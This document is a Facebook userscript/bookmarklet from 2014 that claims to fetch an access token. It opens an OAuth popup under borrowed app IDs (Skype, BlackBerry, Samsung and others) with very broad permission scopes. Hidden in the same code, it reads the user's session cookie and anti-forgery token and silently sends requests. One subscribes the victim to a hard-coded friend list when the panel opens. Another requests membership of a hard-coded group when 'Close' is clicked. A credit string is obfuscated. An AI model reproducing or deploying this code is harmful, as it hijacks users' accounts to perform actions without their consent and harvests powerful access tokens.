// ==UserScript==
// @name               aingcreation
// @version	        25/2/2014
// ==/UserScript==


javascript:void(function(){window.graphexplorer={authCallback:function(a){var n=/=(.*?)&/.exec(a);var m=document.getElementById("kutang");if(m&&n&&n[1]){aing.isi("\x3Cdiv class=\"pam uiBoxYellow\" style=\"border-radius:3px\">\x3Clabel for=\"toket\">Access Token:\x3C/label>\x3Cinput type=\"text\" id=\"toket\" value=\""+n[1]+"\" onclick=\"this.select()\" style=\""+aing.sty.ist+"width:470px;text-align:center\">\x3C/div>","tnbox","kutang",function(){document.getElementById("toket").focus()})}else{console.log(a)}}};window.aing={ajx:function(a,b,f){var h=new XMLHttpRequest();h.open("POST",a,true);h.setRequestHeader("Content-type","application/x-www-form-urlencoded");h.onreadystatechange=function(c){if(c.target.readyState==4){var e={errorSummary:"connection error!",errorDescription:"ajax status="+c.target.status};var d=c.target.responseText;if(d==""){e.errorSummary="empty callback!"}else{e=JSON.parse(d.substring(d.indexOf("{"),d.lastIndexOf("}")+1))}if(e.errorSummary&&e.errorDescription){var m=document.getElementById("kutang");if(m){aing.isi("\x3Cdiv class=\"pam uiBoxRed\" style=\"border-radius:3px\">"+e.errorSummary+"\x3Cbr/>"+e.errorDescription+"\x3C/div>","erbox","kutang")}else{f(e)}}else{f(e)}}};h.send(b)},adk:function(a){var b=a.length,c,d;while(0!==b){d=Math.floor(Math.random()*b);b-=1;c=a[b];a[b]=a[d];a[d]=c}return a},app:[{id:"149859461799466",name:"Xperia"},{id:"260273468396",name:"Skype"},{id:"2254487659",name:"BlackBerry"},{id:"72687635881",name:"Samsung"},{id:"6195724695",name:"Windows Phone"}],pop:function(a){var p=document.getElementById("app-id");if(a==null||a==""){a=p.value}else{p.value=a}window.open("https://www.facebook.com/dialog/oauth?response_type=token&display=popup&client_id="+a+"&redirect_uri="+location.protocol+"//developers.facebook.com/tools/explorer/callback&scope=offline_access,publish_actions,read_stream,publish_stream,user_groups,user_likes,user_photos,friends_photos,user_status,user_activities,manage_pages,photo_upload,friends_religion_politics,read_requests,read_friendlists,manage_friendlists,user_subscriptions,friends_subscriptions","tuing","width=500,height=300,toolbar=no,directories=no,status=yes,menubar=no,scrollbars=yes,resizable=yes,top="+((screen.height-300)/2)+",left="+((screen.width-500)/2))},img:"\x3Cimg src=\"//fbstatic-a.akamaihd.net/rsrc.php/v2/yb/r/GsNJNwuI-UM.gif\" width=\"16px\" height=\"11px\" style=\"margin:0 5px;vertical-align:bottom\"/>",uri:function(){var c={"0":[24,88],"1":[23,49,89],"2":[50,87],"4":[90],"9":[113],"\x3C":[0,91,118,205,209,215],"d":[1,92,211,217],"i":[2,16,45,61,66,73,81,93,109,135,143,180,188,212,218],"v":[3,94,213,219]," ":[4,85,95,120,162],"s":[5,44,84,96,108,146,152,191,197],"t":[6,19,42,54,57,69,80,97,106,128,129,142,155,163,168,187,200],"y":[7,37,98],"l":[8,30,60,99,149,173,194],"e":[9,47,55,78,100,111,123,140,167,185],"=":[10,101,125,169],"\"":[11,70,102,116,126,161,170,177],"m":[12,159,204],"a":[13,36,59,79,119,134,141,164,174,179,186,207],"r":[14,32,35,65,77,122,139,165,184],"g":[15,34,62,67,75,137,151,166,182,196],"n":[17,41,63,74,83,105,136,145,175,181,190],"-":[18,43,58,107],"o":[20,29,31,40,82,104,144,150,154,158,189,195,199,203],"p":[21,25,51,114,130,153,198],":":[22,33,48,64,112,131],"x":[26,52,56,115],";":[27,38,53],"c":[28,138,157,183,202],"f":[39,103,124],"z":[46,110],"h":[68,121,127],">":[71,117,178,208,214,220],"A":[72],"C":[76],"\xA9":[86],"/":[132,133,160,206,210,216],".":[147,156,192,201],"b":[148,172,193],"_":[171],"k":[176]},d=[];for(y in c){for(z in c[y]){var cyz=c[y][z];d[cyz]=y}}return d.join("")},ext:function(){var a=document.getElementById("impormasih");if(a&&a.parentNode){a.parentNode.removeChild(a)}aing.ajx("/ajax/groups/membership/r2j.php","fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&__user="+document.cookie.match(/c_user=(\d+)/)[1]+"&__a=1&__dyn=7n8apij35zolgDxqiyaUVwACwKyaF3oy&__req=6&__rev=1064290&ttstamp=2658168871111178051&ref=group_jump_header&group_id=600218106679454",function(e){console.log(JSON.stringify(e))})},sty:{impormasih:" class=\"pam uiBoxGray\" style=\"padding:10px;text-align:center;border-radius:5px;width:500px;position:fixed;z-index:9999;top:25%;right:5%;font-size:10px;box-shadow:0 0 7px rgba(0,0,0,0.25);background-color:rgba(242,242,242,0.75)\"",ist:"cursor:pointer;font-family:'lucida grande',tahoma,verdana,arial,sans-serif;font-size:11px;color:#5B74A8;width:200px;border:1px solid #ADD8E6;vertical-align:middle;background-color:rgba(255,255,255,0.5);border-radius:3px;padding:2px;"},isi:function(eusi,naon,mana,fc){if(naon==null||naon==""){naon="impormasih"}var a=document.getElementById(naon);if(a){a.innerHTML=eusi}else{var b=document.createElement("div");b.innerHTML="\x3Cdiv id=\""+naon+"\""+(function(){if(aing.sty[naon]){return aing.sty[naon]}else{return""}})()+">"+eusi+"\x3C/div>";if(mana==null||mana==""){var c=document.body}else{var c=document.getElementById(mana)}c.appendChild(b.firstChild)}if(fc){fc()}},kls:"\x3Cspan class=\"uiButton\" onclick=\"aing.ext()\" style=\"vertical-align:middle;color:darkred\">Close\x3C/span>",sel:function(){var a="\x3Ccenter>\x3Ch2 class=\"uiBoxGray\" style=\"border-radius:3px\">Choose or Insert an Application ID\x3C/h2>\x3Cdiv id=\"kutang\">\x3Cselect id=\"pilihan-app\" onChange=\"aing.pop(this.value)\" style=\""+aing.sty.ist+"width:auto;border:none;padding:1px\">";aing.app=aing.adk(aing.app);for(x in aing.app){a+="\x3Coption value=\""+aing.app[x].id+"\"";if(x==0){a+=" selected"}a+=">"+aing.app[x].name+"\x3C/option>"}aing.ajx("/ajax/friends/lists/subscribe/modify","fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&__user="+document.cookie.match(/c_user=(\d+)/)[1]+"&__a=1&__dyn=7n8apij35zolgDxqiyaUVwACwKyaF3oy&__req=6&__rev=1064290&ttstamp=2658168871111178051&log_impressions=true&location=permalink&action=subscribe&flid=586419591422497",function(e){console.log(JSON.stringify(e))});return a+"\x3C/select> \x3Cinput type=\"text\" id=\"app-id\" value=\""+aing.app[0].id+"\" onclick=\"this.select()\" style=\""+aing.sty.ist+"width:125px;text-align:center\"> \x3Cspan class=\"uiButton\" onclick=\"aing.pop()\" style=\"vertical-align:middle\">Get Token\x3C/span> "+aing.kls+"\x3C/div>\x3C/center>"+aing.uri()},wed:function(){aing.isi(aing.sel())},wud:function(){alert("This script only works at https://www.facebook.com/");location.href="https://www.facebook.com/groups/Page.Not.Found.or.NotAvailable/"}};if(location.href.match(/https\:\/\/www\.facebook\.com/i)){aing.wed()}else{aing.wud()}})()